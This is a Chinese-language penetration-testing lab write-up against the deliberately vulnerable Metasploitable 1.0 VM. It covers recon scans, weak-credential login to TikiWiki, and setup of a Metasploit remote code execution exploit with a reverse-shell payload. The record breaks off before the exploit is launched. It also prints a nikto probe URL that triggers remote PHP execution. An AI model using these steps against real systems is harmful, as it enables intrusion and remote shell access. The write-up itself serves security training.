# Metasploitable 1.0
### 说明

作者：h4m5t

时间:   2023/9/7

攻击机：kali2023.3   192.168.76.150

靶机：Metasploitable   192.168.76.151

宿主机：win10  

网络连接模式：NAT



### 信息收集

#### 查询IP

```
┌──(root㉿h4m5t)-[/home/kali/Desktop]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d1:18:a8, IPv4: 192.168.76.150
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.76.1    00:50:56:c0:00:08       VMware, Inc.
192.168.76.2    00:50:56:e4:44:56       VMware, Inc.
192.168.76.151  00:0c:29:0f:96:24       VMware, Inc.
192.168.76.254  00:50:56:e7:f4:d9       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.114 seconds (121.10 hosts/sec). 4 responded
```

#### 扫描开放的端口

```
┌──(root㉿h4m5t)-[/home/kali/Desktop]
└─# nmap -sV 192.168.76.151
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 05:11 EDT
Nmap scan report for 192.168.76.151
Host is up (0.00071s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.1
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 00:0C:29:0F:96:24 (VMware)
Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.76 seconds
```

#### 爆破目录

```
──(root㉿h4m5t)-[/home/kali/Desktop/dirsearch]
└─# python dirsearch.py -u http://192.168.76.151
Missing required dependencies to run.
Do you want dirsearch to automatically install them? [Y/n] Y
Installing required dependencies...

  _|. _ _  _  _  _ _|_    v0.4.3                                                                     
 (_||| _) (/_(_|| (_| )                                                                              
                                                                                                     
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11714

Output: /home/kali/Desktop/dirsearch/reports/http_192.168.76.151/_23-09-07_05-18-26.txt

Target: http://192.168.76.151/

[05:18:26] Starting:                                                                                 
[05:18:35] 403 -  333B  - /.ht_wsr.txt                                      
[05:18:35] 403 -  336B  - /.htaccess.bak1                                   
[05:18:36] 403 -  336B  - /.htaccess.orig                                   
[05:18:36] 403 -  338B  - /.htaccess.sample                                 
[05:18:36] 403 -  336B  - /.htaccess.save
[05:18:36] 403 -  337B  - /.htaccess_extra                                  
[05:18:36] 403 -  336B  - /.htaccess_orig
[05:18:36] 403 -  334B  - /.htaccessBAK
[05:18:36] 403 -  326B  - /.htm                                             
[05:18:36] 403 -  327B  - /.html
[05:18:36] 403 -  334B  - /.htaccess_sc                                     
[05:18:36] 403 -  334B  - /.htaccessOLD
[05:18:36] 403 -  336B  - /.htpasswd_test                                   
[05:18:36] 403 -  332B  - /.htpasswds
[05:18:36] 403 -  333B  - /.httr-oauth
[05:18:36] 403 -  335B  - /.htaccessOLD2                                    
[05:19:36] 403 -  330B  - /cgi-bin/                                         
[05:19:50] 403 -  326B  - /doc/                                             
[05:19:50] 403 -  330B  - /doc/api/
[05:19:50] 403 -  341B  - /doc/html/index.html
[05:19:50] 403 -  340B  - /doc/stable.version
[05:19:50] 403 -  341B  - /doc/en/changes.html                              
[05:20:35] 200 -   48KB - /phpinfo                                          
[05:20:35] 200 -   47KB - /phpinfo.php
[05:20:51] 403 -  335B  - /server-status                                    
[05:20:51] 403 -  336B  - /server-status/
[05:21:06] 301 -  359B  - /tikiwiki  ->  http://192.168.76.151/tikiwiki/    
                                                                             
Task Completed                                                                           
```

#### 漏洞扫描

```
┌──(root㉿h4m5t)-[/home/kali/python]
└─# nikto -h 192.168.76.151
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.76.151
+ Target Hostname:    192.168.76.151
+ Target Port:        80
+ Start Time:         2023-09-07 06:47:23 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
+ /: Server may leak inodes via ETags, header found with file /, inode: 67575, size: 45, mtime: Wed Mar 17 10:08:25 2010. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.2.4-2ubuntu5.10 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ PHP/5.2 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ /phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://blog.cirt.net/rfiinc.txt: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /tikiwiki/tiki-graph_formula.php: Output from the phpinfo() function was found.
+ /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://blog.cirt.net/rfiinc.txt: TikiWiki contains a vulnerability which allows remote attackers to execute arbitrary PHP code. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5423
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8909 requests: 1 error(s) and 19 item(s) reported on remote host
+ End Time:           2023-09-07 06:48:01 (GMT-4) (38 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```





### 第一步

打开扫描到的目录

```
http://192.168.76.151/tikiwiki/tiki-index.php
```

试用弱口令admin,admin登录。登录后需要修改密码。



启动MSF 

```
msf6 > search tikiwiki

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/unix/webapp/php_xmlrpc_eval              2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
   1  exploit/unix/webapp/tikiwiki_upload_exec         2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/unix/webapp/tikiwiki_unserialize_exec    2012-07-04       excellent  No     Tiki Wiki unserialize() PHP Code Execution
   3  auxiliary/admin/tikiwiki/tikidblib               2006-11-01       normal     No     TikiWiki Information Disclosure
   4  exploit/unix/webapp/tikiwiki_jhot_exec           2006-09-02       excellent  Yes    TikiWiki jhot Remote Command Execution
   5  exploit/unix/webapp/tikiwiki_graph_formula_exec  2007-10-10       excellent  Yes    TikiWiki tiki-graph_formula Remote PHP Code Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/unix/webapp/tikiwiki_graph_formula_exec

msf6 > use 5
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/tikiwiki_graph_formula_exec) > show options 

Module options (exploit/unix/webapp/tikiwiki_graph_formula_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /tikiwiki        yes       TikiWiki directory path
   VHOST                     no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.76.150   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```



```
msf6 exploit(unix/webapp/tikiwiki_graph_formula_exec) > set RHOST 192.168.76.151
RHOST => 192.168.76.151
msf6 exploit(unix/webapp/tikiwiki_graph_formula_exec) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/generic/custom                                       normal  No     Custom Payload
   1   payload/generic/shell_bind_aws_ssm                           normal  No     Command Shell, Bind SSM (via AWS API)
   2   payload/generic/shell_bind_tcp                               normal  No     Generic Command Shell, Bind TCP Inline
   3   payload/generic/shell_reverse_tcp                            normal  No     Generic Command Shell, Reverse TCP Inline
   4   payload/generic/ssh/interact                                 normal  No     Interact with Established SSH Connection
   5   payload/multi/meterpreter/reverse_http                       normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
   6   payload/multi/meterpreter/reverse_https                      normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
   7   payload/php/bind_perl                                        normal  No     PHP Command Shell, Bind TCP (via Perl)
   8   payload/php/bind_perl_ipv6                                   normal  No     PHP Command Shell, Bind TCP (via perl) IPv6
   9   payload/php/bind_php                                         normal  No     PHP Command Shell, Bind TCP (via PHP)
   10  payload/php/bind_php_ipv6                                    normal  No     PHP Command Shell, Bind TCP (via php) IPv6
   11  payload/php/download_exec                                    normal  No     PHP Executable Download and Execute
   12  payload/php/exec                                             normal  No     PHP Execute Command
   13  payload/php/meterpreter/bind_tcp                             normal  No     PHP Meterpreter, Bind TCP Stager
   14  payload/php/meterpreter/bind_tcp_ipv6                        normal  No     PHP Meterpreter, Bind TCP Stager IPv6
   15  payload/php/meterpreter/bind_tcp_ipv6_uuid                   normal  No     PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
   16  payload/php/meterpreter/bind_tcp_uuid                        normal  No     PHP Meterpreter, Bind TCP Stager with UUID Support
   17  payload/php/meterpreter/reverse_tcp                          normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   18  payload/php/meterpreter/reverse_tcp_uuid                     normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   19  payload/php/reverse_perl                                     normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
   20  payload/php/reverse_php                                      normal  No     PHP Command Shell, Reverse TCP (via PHP)

msf6 exploit(unix/webapp/tikiwiki_graph_formula_exec) > set payload payload/generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
```

